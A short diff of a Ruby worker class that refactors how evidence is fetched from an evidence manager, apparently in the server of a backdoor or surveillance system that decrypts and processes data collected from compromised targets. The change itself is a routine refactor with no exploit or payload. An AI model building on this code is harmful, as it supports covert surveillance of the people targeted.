@@ -43,21 +43,21 @@ class Worker
   
   def process
     require 'pp'
-    
-    info = RCS::EvidenceManager.instance.instance_info(@instance)
+
+    info = RCS::EvidenceManager.instance_info(@instance)
     trace :info, "Processing backdoor #{info['build']}:#{info['instance']}"
     
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
     trace :debug, "Evidence key #{info['key']}"
     evidence_key = Digest::MD5.digest info['key']
-    
-    evidence_sizes = RCS::EvidenceManager.instance.evidence_info(@instance)
-    evidence_ids = RCS::EvidenceManager.instance.evidence_ids(@instance)
+
+    evidence_sizes = RCS::EvidenceManager.evidence_info(@instance)
+    evidence_ids = RCS::EvidenceManager.evidence_ids(@instance)
     trace :info, "Pieces of evidence to be processed: #{evidence_ids.join(', ')}."
     
     evidence_ids.each do |id|
-      binary = RCS::EvidenceManager.instance.get_evidence(id, @instance)
+      binary = RCS::EvidenceManager.get_evidence(id, @instance)
       trace :info, "Processing evidence #{id}: #{binary.size} bytes."
       
       # deserialize evidence
